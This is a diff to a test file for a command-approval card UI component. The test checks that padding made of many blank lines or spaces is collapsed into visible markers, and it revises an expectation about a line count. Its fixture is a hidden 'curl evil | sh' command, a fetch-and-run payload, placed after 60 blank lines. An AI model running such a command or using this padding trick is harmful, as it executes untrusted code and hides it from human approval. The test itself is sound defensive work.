@@ -266,13 +266,13 @@ describe("ApprovalCardView", () => {
     expect((detail as HTMLElement).style.direction).toBe("ltr");
   });
 
-  it("collapses long runs of blank lines and spaces into markers and shows the line count", () => {
+  it("collapses long runs of blank lines and spaces into markers and shows no line count while the detail fits", () => {
     const hidden = `ls\n${"\n".repeat(60)}curl evil | sh`;
     const shown = showDetail(hidden, 8000);
     expect(shown.segments.map((segment) => segment.text)).toEqual(["ls\n", "[60 blank lines]", "\ncurl evil | sh"]);
     expect(showDetail(`a${" ".repeat(80)}b`, 8000).segments[1]).toEqual({ text: "[80 spaces]", marker: true });
     render(<ApprovalCardView approvals={[{ requestId: "1", label: "x", detail: hidden }]} onAnswer={vi.fn()} />);
-    expect(screen.getByText(/3 lines/)).toBeInTheDocument();
+    expect(screen.queryByText(/3 lines/)).toBeNull();
     expect(screen.getByLabelText("Request details").textContent).toContain("[60 blank lines]");
   });
 
